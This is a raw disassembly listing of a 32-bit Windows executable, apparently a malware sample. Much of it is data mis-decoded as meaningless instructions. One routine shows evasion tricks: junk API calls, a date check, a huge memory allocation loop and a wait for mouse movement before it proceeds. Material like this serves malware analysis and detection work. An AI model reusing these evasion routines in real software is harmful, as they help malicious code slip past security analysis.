pop es
pop es
pop es
pop es
jle r-xdata
sbb ch [ eax + 0x68 ]
pop es
push 0x97973b82
xchg edi eax
jg r-xdata
sub [ eax + 0x68 ] ebp
dec esp
loop r-xdata
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0xcd55
xchg ebp eax
xchg edi eax
push 0x687def7e
sub [ eax + 0x68 ] ebp
jle r-xdata
pop es
pop es
pop es
jle r-xdata
sahf
pop esi
push 0x5e126868
jle r-xdata
std
jge r-xdata
pop es
push 0x7076868
pop es
int1
lodsb [ esi ]
jle r-xdata
pop es
xor [ eax + 0x68 ] ebp
pop es
pop es
push eax
rcr [ edi - 0x19 ] cl
in eax 0xfb
pop es
pop es
jle r-xdata
sbb eax 0x7076868
pop es
dec edx
push 0x7070768
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
les ebx [ edx ]
adc bh [ ebx + 0x6a ]
push 0x42407e68
push 0x7070768
pop es
pop es
pop es
mov bh 0x7e
dec [ ebx + 0x68 ]
push 0xad831d07
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
push 0x7070768
pop es
pop es
pop es
jb r-xdata
pop es
pop es
pop es
pop es
xchg ebx eax
xchg edi eax
xchg edi eax
inc eax
int1
pop es
cwde
adc ah [ eax + 0x1c686804 ]
sub ch [ eax + 0x68 ]
jle r-xdata
pop es
sbb eax 0xab7ead83
push cs
push 0x7070768
pop es
pop es
enter 0xa07e 0x63
push 0x7070768
pop es
adc ah [ ecx - 0x68 ]
adc edi ebx
add [ eax + 0x68 ] ebp
jle r-xdata
push 0xf1401c68
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070707
pop es
pop es
push eax
shl [ ebx - 0x24 ] cl
rcr edx 0xdc
jle r-xdata
je r-xdata
xchg edi eax
pop es
pop es
jle r-xdata
push 0x7070768
cwde
adc eax 0x68681bb6
rcl [ eax + ebp * 2 ] 0x1
xchg esp eax
jle r-xdata
push 0x687b0e7f
push 0x5e9e7ece
sub_4926ea
push 0x511ccfe4
sar [ edi - 0x43 ] 0xa
push 0x4917e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0xcd55
sub_49270b
sub ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
adc ah [ ecx + 0x7e ]
outsb
pop edx
push 0x7070768
pop es
pop es
pop es
pop es
int1
push ds
retn 0x7e67
sub_492738
mov ah 0x48
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jg r-xdata
and [ edx ] ebp
push 0x7070768
pop es
pop es
pop es
pop es
pop es
int1
adc ah [ ecx + 0x7e ]
outsb
pop edx
push 0x7070768
pop es
pop es
pop es
pop es
int1
push ds
retn 0x7e67
or [ eax + 0x68 ] ch
into
adc al 0x6f
xchg esi eax
cwde
adc eax [ esi + 0x7e686803 ]
sbb [ ebx ] esi
push 0xacf10768
xchg esi eax
jle r-xdata
sub ebp [ eax + 0x68 ]
push [ ebp + 0x18 ]
into
iretd
adc ch [ eax + 0x68 ]
pop es
pop es
sbb al 0xd3
mov bl 0x83
lodsb [ esi ]
rcl [ ebx + 0x64581598 ] 0x1
push 0x7ff07e68
push 0x517e0768
sbb eax 0xd7076868
push esp
pop es
pop es
pop es
pop es
pop es
std
xchg edi eax
jle r-xdata
lds ecx [ eax + ebp * 2 ]
push 0x60070707
dec edi
pop ebp
push 0x7070768
pop es
sbb bl [ edx ]
and ebp [ edi + 0x68 ]
push 0x68683c7e
push 0x685be87f
push 0x680cc57e
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
inc esp
push 0x7070768
jg r-xdata
sbb al 0x2
dec ebx
push 0x68
push 0x179f031e
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0x11
sub edx [ edi + 0x57fe9797 ]
adc edx [ edi + 0x11949797 ]
push edi
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
sub_492966
sbb al 0x51
jle r-xdata
dec esi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7f070707
pop ebp
push 0x7070768
pop es
pop es
push 0x97973b01
xchg edi eax
jle r-xdata
push edx
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push ecx
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
jmp [ esi - 0x76 ]
sub_4929a8
push ds
push 0x9b531468
jg r-xdata
push 0x7070768
jle r-xdata
sub eax 0xdeff6868
sbb al 0x44
or eax eax
jle r-xdata
jbe r-xdata
dec ecx
push 0xd2500768
jpo r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
fcmovu st4
shl ecx 0x50
shl [ edi - 0x26 ] cl
xchg edi eax
push eax
ror [ edi - 0x26 ] cl
pop es
push ds
fiadd [ ebx - 0x32 ]
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
jecxz r-xdata
jle r-xdata
push ecx
dec esi
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
jmp [ esi - 0x76 ]
push 0xc0070768
push ds
pop esi
push 0x7070768
pop es
pop es
pop es
std
mov ch 0x7e
add [ eax + ebp * 2 + 0x68 ] 0x7
iretd
xor ch [ eax + 0x68 ]
pop es
pop es
enter 0xa37e 0x7c
push 0x4c7ec968
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7f070707
pop ebp
push 0x7070768
adc dl [ edi + 0x7e ]
add ebp [ ss : eax + 0x68 ]
push 0x19f27e68
pop es
cwde
and [ esi + 0x6835867e ] al
push 0xf143d21a
push ds
loop r-xdata
adc al 0x68
push 0x647ec707
insd
push 0x7070768
pop es
pop es
jle r-xdata
pop es
pop es
push 0x97973b01
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push edx
push 0x7070768
push esp
and [ eax + 0x68 ] ch
pop es
pop es
jle r-xdata
jpo r-xdata
bound ebp [ eax + 0x68 ]
movsb [ edi ] [ esi ]
push 0xf6fdcf07
jle r-xdata
insb
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc ch [ eax - 0x68 ]
adc esp [ eax ]
push edx
push 0x76247e68
push 0x137ec768
push ds
push 0x7070768
pop es
pop es
pop es
push 0x7545ecc
jle r-xdata
push 0x57120707
jle r-xdata
dec esp
sbb dl dl
pop ds
adc eax 0xa4686862
and eax 0x7076868
pop es
pop es
pop es
pop es
cwde
adc al [ edx + 0x1a686833 ]
adc esi [ ebx - 0x686868f9 ]
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
push 0x7070768
pop es
jle r-xdata
jpe r-xdata
int1
push ds
0x1c7f
xchg edi eax
xchg edi eax
jle r-xdata
pop es
pop es
movsb [ edi ] [ esi ]
push edi
pop esi
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
add ebp [ eax + 0x68 ]
jle r-xdata
dec ebp
push 0x7070768
push 0x68070768
add [ edi ] esp
jpo r-xdata
xchg edi eax
xchg edi eax
daa
bound ebp [ eax + 0x68 ]
int1
push ds
shl [ edi - 0x31 ] cl
push 0x7070707
pop es
pop es
pop es
pop es
int1
push ds
shl [ ebp - 0x31 ] cl
std
idiv [ esi - 0x58 ]
inc edx
push 0x1e070768
xchg ecx eax
lodsb [ esi ]
push esp
jle r-xdata
xchg edi eax
xchg edi eax
rcl ebx 0x1
jg r-xdata
push 0x1ec00707
xchg edi eax
pop es
pop es
pop es
pop es
sbb al 0x4f
adc al 0x53
fwait
adc cl [ eax + ebx * 4 + 0x13 ]
insb
dec edx
push 0x62a17e68
push 0xd21ef168
ja r-xdata
push 0x7076868
iretd
pop es
pop es
xlat
enter 0x7ec9 0xae
sub ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
xchg edi eax
add ebp [ eax + 0x68 ]
pop es
pop es
push 0x97972701
std
cmc
jle r-xdata
sub_492c19
push 0x7070768
jg r-xdata
dec esp
cwde
adc ebp [ edx + ecx * 2 + 0x68 ]
push 0x6862a17e
push 0x77d21ef1
iretd
sub eax 0x7ec16868
out 0x6a eax
push 0x7070768
pop es
pop es
pop es
jle r-xdata
pop es
pop es
pop es
pop es
pop ebx
push 0x74657e68
push 0x7070768
pop es
pop es
cmp eax 0x7076868
pop esp
push 0x14f10768
stosd [ edi ]
xchg [ edi + 0x6807d67e ] dl
push 0x817ecece
sub al 0x68
push 0x7070707
jle r-xdata
cmp ch [ eax + 0x68 ]
sbb al 0x46
int1
push ds
retn 0x7e4d
jns r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
push 0x7070707
sub ebp [ eax + 0x68 ]
sbb al 0x4e
jle r-xdata
pop edi
push 0x2980768
push edi
pop esi
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
fidivr [ edi + 0x7e ]
cmp al 0x17
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x57
sbb [ esi ] 0xffffffd2
outsd
jle r-xdata
pop es
pop es
pop es
pop es
pop es
adc al 0xea
imul edx [ eax + ebx * 4 + 0x68206b15 ] 0x68
pop ds
shl [ ebx ] cl
jle r-xdata
push es
push 0x5e12f168
jle r-xdata
0x5c7e9687 0x682e
inc eax
push 0x7070768
pop es
pop es
pop es
pop es
pop ss
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
cmp ebp [ eax + 0x68 ]
pop es
pop es
std
jle r-xdata
int1
push ds
rol [ ecx - 0x5c ] cl
push edi
jle r-xdata
popad
push 0x1b1a0768
mov bl 0x37
xchg ebp eax
xchg edi eax
xchg edi eax
mov bh 0x1c
push ecx
jle r-xdata
pop es
lodsb [ esi ]
shr [ edi + 0x7e ] cl
0x6876
xor [ eax + 0x68 ] ebp
pop es
sub_492c69
pop esp
pop es
pop es
pop es
pop es
pop es
adc al 0xea
imul edx [ eax + ebx * 4 + 0x68206b15 ] 0x68
pop ds
shl [ ebx ] cl
jle r-xdata
push es
push 0x5e12f168
jle r-xdata
pop esp
push 0x14f10768
stosd [ edi ]
xchg [ edi + 0x6807d67e ] dl
push 0x817ecece
sub al 0x68
push 0x7070707
jle r-xdata
cmp ch [ eax + 0x68 ]
sbb al 0x46
pop es
cmp ebp [ eax + 0x68 ]
pop es
pop es
std
jle r-xdata
int1
push ds
retn 0x7e4d
jns r-xdata
sub ebp [ eax + 0x68 ]
sbb al 0x4e
jle r-xdata
pop edi
push 0x2980768
push edi
pop esi
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
fidivr [ edi + 0x7e ]
cmp al 0x17
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x57
sbb [ esi ] 0xffffffd2
outsd
jle r-xdata
int1
push ds
rol [ ecx - 0x5c ] cl
push edi
jle r-xdata
popad
push 0x1b1a0768
mov bl 0x37
xchg ebp eax
xchg edi eax
xchg edi eax
mov bh 0x1c
push ecx
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070707
0x5c7e9687 0x682e
inc eax
push 0x7070768
pop es
pop es
pop es
pop es
pop ss
pop es
pop es
cmp eax 0x7076868
pop es
lodsb [ esi ]
shr [ edi + 0x7e ] cl
0x6876
xor [ eax + 0x68 ] ebp
pop es
sub_492ca8
cmp eax 0x7076868
pop es
sar [ esi - 0x42 ] 0x5c
int1
push ds
retn 0x7e4d
jns r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
push 0x7070707
sub ebp [ eax + 0x68 ]
sbb al 0x4e
jle r-xdata
pop edi
push 0x2980768
push edi
pop esi
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
fidivr [ edi + 0x7e ]
cmp al 0x17
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x57
sbb [ esi ] 0xffffffd2
outsd
jle r-xdata
pop es
pop es
pop es
pop es
pop es
adc al 0xea
imul edx [ eax + ebx * 4 + 0x68206b15 ] 0x68
pop ds
shl [ ebx ] cl
jle r-xdata
push es
push 0x5e12f168
jle r-xdata
0x5c7e9687 0x682e
inc eax
push 0x7070768
pop es
pop es
pop es
pop es
pop ss
push 0x14f10768
stosd [ edi ]
xchg [ edi + 0x6807d67e ] dl
push 0x817ecece
sub al 0x68
push 0x7070707
jle r-xdata
pop esp
cmp ch [ eax + 0x68 ]
sbb al 0x46
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
cmp ebp [ eax + 0x68 ]
pop es
pop es
std
jle r-xdata
int1
push ds
rol [ ecx - 0x5c ] cl
push edi
jle r-xdata
popad
push 0x1b1a0768
mov bl 0x37
xchg ebp eax
xchg edi eax
xchg edi eax
mov bh 0x1c
push ecx
jle r-xdata
pop es
pop es
cmp eax 0x7076868
pop es
lodsb [ esi ]
shr [ edi + 0x7e ] cl
0x6876
xor [ eax + 0x68 ] ebp
pop es
sub_492d60
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403a98
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_492d8c
retn
sub_492d90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
xor eax eax
push ebp
push sub_492f51
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_492f58
retn
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
nop
nop
call GetLastError
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
push 0x0
push 0x0
call GetDeviceCaps
jmp r-xdata
nop
nop
mov ebx 0x144f
nop
nop
jmp r-xdata
push 0x0
push 0x0
call GetDeviceCaps
push 0x0
push 0x0
call GetDeviceCaps
nop
dec ebx
jne r-xdata
push 0x0
push 0x0
call GetDeviceCaps
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
push 0x0
push 0x0
call GetDeviceCaps
nop
nop
push 0x0
push 0x0
call GetDeviceCaps
mov ebx 0x8c81
nop
nop
jmp r-xdata
push 0x0
push 0x0
call GetDeviceCaps
dec ebx
jne r-xdata
push 0x0
push 0x0
call GetDeviceCaps
nop
push 0x4
push 0x3000
push 0x21bf2c40
push 0x0
call VirtualAlloc
mov esi eax
test esi esi
je r-xdata
nop
nop
push 0x0
push 0x0
call GetDeviceCaps
mov ebx 0x1
add ecx esi
mov [ ecx ] dl
nop
inc ebx
cmp ebx 0x21bf13b6
jne r-xdata
call sub_40325c
nop
nop
mov ecx ebx
nop
lea eax [ ecx + 0x1 ]
push ecx
mov ecx 0x56
xor edx edx
div ecx
pop ecx
cmp edx 0xff
jbe r-xdata
nop
nop
push 0x8000
push 0x0
push esi
call VirtualFree
nop
mov ebx 0x8bee
push 0x0
push 0x0
call GetDeviceCaps
dec ebx
jne r-xdata
xor ebx ebx
nop
nop
push rw-data
call GetCursorPos
nop
nop
push 0x0
push 0x25
call SleepEx
nop
cmp ebx 0x3
jbe r-xdata
nop
inc ebx
nop
mov eax [ edi ]
mov [ rw-data ] eax
nop
nop
nop
push edi
call GetCursorPos
nop
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0x32
jbe r-xdata
push 0x0
call sub_48acd4
nop
nop
sub_492fb4
insb
add [ eax ] al
add [ edi + ebp + 0x62a80049 ] bh
inc eax
add [ eax + 0x62 ] bh
inc eax
add [ eax + 0x60480040 ] bl
inc eax
add [ ebx + 0x40 ] ah
add [ ebx ] dh
inc eax
add [ eax + esi * 2 + 0x40 ] ch
add [ eax + esi * 2 ] bh
inc eax
add [ eax + esi * 2 + 0x70740040 ] ah
inc eax
add [ esp + ebx * 2 ] ah
inc ecx
add ah dh
pop ebx
inc ecx
add ah dl
jae r-xdata
add [ eax - 0x23ffbd59 ] al
lds eax [ edx ]
pushfd
lds eax [ edx ]
movsb [ edi ] [ esi ]
mov ch 0x42
add [ ebp + esi * 4 + 0x42 ] dh
add [ esi + ebp * 4 ] ah
inc edx
add ah dh
lodsd [ esi ]
inc edx
add [ eax - 0x77ffbdd0 ] bh
xor [ edx ] al
mov esp 0xe80042a3
mov [ 0xffffffffcecc0042 ] al
inc ebp
add [ esi + ecx * 8 - 0x4a1bffbb ] bl
inc edx
add [ ebp + esi * 4 + 0x34880042 ] dh
inc esi
add [ eax ] bl
xor al 0x46
add [ ebx + ecx * 8 ] bl
inc edx
add ah ch
0x42
add [ ebx + esi * 2 - 0x224bffc0 ] ah
inc eax
add [ esp + ebx * 8 ] dh
inc eax
add [ eax ] ah
out 0x40 al
add al dh
in eax 0x40
add [ eax + 0x4c ] al
inc ecx
add al cl
dec ebx
inc ecx
add [ esi + ecx * 2 ] bl
inc ecx
add ah ch
dec ebp
inc ecx
add ah cl
pop ebx
inc ecx
add [ ebx + ebx * 2 + 0x41 ] bh
add [ ebp + ebp + 0x42 ] dl
add [ esp + ebp - 0x5b07ffbe ] ah
inc edx
add al cl
movsb [ edi ] [ esi ]
inc edx
add [ eax - 0x7fffbd59 ] dh
cmpsd [ esi ] [ edi ]
inc edx
add ah bl
sub_4931a5
xor eax 0x355c0047
inc edi
add [ eax ] dh
xor eax 0x34ec0047
inc edi
add [ edx + ecx * 2 ] al
inc edi
add [ eax + 0x49 ] cl
inc edi
add [ eax + 0x24 ] al
inc edi
add [ eax ] dl
and al 0x47
add [ eax ] bl
dec esp
inc edi
add al ch
dec ebx
inc edi
add [ edi + ecx * 2 ] al
inc edi
add ah dl
dec esi
inc edi
add [ edx * 2 + 0x54e40047 ] ch
inc edi
add [ eax ] ah
pop esi
inc edi
add al dh
pop ebp
inc edi
add [ eax + 0x61 ] dl
inc edi
add [ eax ] ah
popad
inc edi
add al bl
bound eax [ edi ]
test al 0x62
inc edi
add [ eax ] dl
arpl [ edi ] ax
loopne r-xdata
nop
int3
inc edi
add [ esp + 0x47 ] ch
add [ esp ] bh
inc edi
add [ edx + ecx * 4 + 0x47 ] dl
add [ edx + ecx * 4 ] ah
inc edi
add [ ebx + ebx * 4 + 0x47 ] bh
add [ ebx + ebx * 4 + 0x47 ] cl
add [ eax + ebp * 4 + 0x47 ] bh
add [ eax + ebp * 4 + 0x47 ] cl
add [ eax + edx * 4 ] ah
inc edi
add ah dh
pop [ edi ]
clc
mov [ edi ] al
enter 0x4788 0x0
xchg esp eax
pushfd
inc edi
add [ esp + ebx * 4 + 0x47 ] ah
add [ eax ] cl
mov al [ 0xffffffff9fd80047 ]
inc edi
add [ eax - 0x77ffb839 ] bh
mov [ edi ] sub_47cc58
sub ah cl
inc edi
add [ ebp + eax * 4 + 0x47 ] dl
add [ eax * 4 + 0x7b700047 ] ah
inc edi
add [ eax ] ah
jpo r-xdata
inc edi
add [ ebx + edi * 8 - 0x4b7ffb9 ] al
inc edi
add [ eax ] dl
adc al 0x48
add al ah
adc ecx [ eax ]
les ecx [ ebp + 0x48 ]
add [ ebp + ecx * 2 + 0x48 ] bh
add [ eax ] al
sbb ecx [ eax ]
les ebx [ edx ]
dec eax
add al al
sbb eax 0x1d840048
dec eax
add [ eax + 0x26 ] dl
dec eax
add [ eax ] ah
dec eax
add [ eax + ebp + 0x286c0048 ] bl
dec eax
add [ eax + 0x50004863 ] al
arpl [ eax ] cx
test al 0x65
dec eax
add [ eax + 0x65 ] bh
dec eax
add [ eax + ebp * 2 + 0x48 ] ch
add [ eax + ebp * 2 ] ah
dec eax
add [ eax ] ah
jpe r-xdata
add [ eax + 0x600047cc ] dl
int3
les ebx [ edi + 0x49 ]
add [ ebx - 0x33ea7500 ] cl
test eax 0x9ce80048
mov al 0xfd
jmp [ ecx + rw-data ]
add [ ecx + edi * 2 + 0x7ae80048 ] al
dec eax
add [ eax + 0x6800487a ] bh
test eax 0xa92c0048
dec eax
add [ eax + 0x6000492d ] dl
sub eax 0x49
add [ eax ] al
mov [ edi ] gs
dec ecx
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
mov eax sub_492fb4
call sub_406234
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46e3d4
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46e3ec
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46e46c
call sub_403fa4
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_492fb4
call sub_406234
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46e3d4
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46e3ec
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46e46c
call sub_403fa4
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405b8c
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405ba0
sub_401244
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ ExitThread@IAT ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40125c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401284
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401294
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40129c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_4012bc
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012dc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ SysFreeString@IAT ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_401324
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40132c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40133c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401390
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401398
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ae2
jmp sub_403a98
sub_401ae9
mov al [ rw-data ]
pop ebp
retn
sub_401bc6
jmp sub_403a98
sub_401c94
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_4022a8
retn
sub_402294
jmp sub_403a98
sub_40243a
jmp sub_403a98
sub_4026d9
jmp sub_403a98
sub_40279c
call sub_4061e8
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_4061e8
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027f0
mov [ rw-data ] edx
call sub_40407c
sub_402854
push eax
push edx
push ecx
call sub_4061e8
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402848
retn
sub_402870
retn
sub_4028c4
retn
sub_4028c8
push ebx
call sub_4061e8
mov ebx [ eax + 0x4 ]
call sub_4061e8
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a80
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a90
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402b50
mov edx [ eax + 0x1c ]
call sub_402b08
retn
sub_402be3
retn
sub_402df4
mov ecx 0xff
call sub_402e00
retn
sub_402e48
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402e70
jmp sub_402e70
sub_402e6d
retn
sub_4031fd
jmp sub_403a98
sub_403250
fninit
fwait
fldcw [ rw-data ]
retn
sub_4032a8
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4032b4
push ebx
mov ebx eax
mov eax ebx
call sub_4032e4
call sub_4026ec
mov edx eax
mov eax ebx
call sub_403328
pop ebx
retn
sub_4032d0
push ebx
mov ebx eax
mov eax ebx
call sub_403380
mov eax ebx
call sub_40270c
pop ebx
retn
sub_4032e4
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_40330c
call sub_4036d0
test dl dl
jle r-xdata
retn
call sub_4036b8
sub_4033cc
retn
sub_403454
jmp sub_403a98
sub_40345b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40354c
mov eax 0x8000ffff
retn
sub_403554
retn
sub_403558
retn
sub_40355c
retn
sub_403691
jmp sub_4037e4
sub_403696
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403af8
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4036b8
sub_4036b8
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4036d0
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4036e0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4037a8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4037c4
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403b91
retn
sub_403cd4
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403d62
jmp sub_4037e4
sub_403dc2
jmp sub_4037e4
sub_403ddc
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403cd4
mov [ rw-data ] 0x0
call sub_403d7c
retn
sub_403f15
retn
sub_404077
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40407c
mov [ rw-data ] eax
call sub_403fa4
sub_404110
push eax
call ExitThread
sub_40433c
retn
sub_404378
retn
sub_404386
retn
sub_40439f
retn
sub_4043b0
retn
sub_404497
retn
j_sub_4045e4#2
jmp sub_4045e4
sub_40462d
retn
sub_404635
retn
sub_404677
retn
sub_4047d0
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
sub_4047e8
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404940
retn
sub_404952
retn
sub_404954
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404b9c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402848
call [ rw-data ]
retn
sub_404ca0
mov ecx 0x1
jmp sub_404bb4
sub_404caa
retn
sub_404cdc
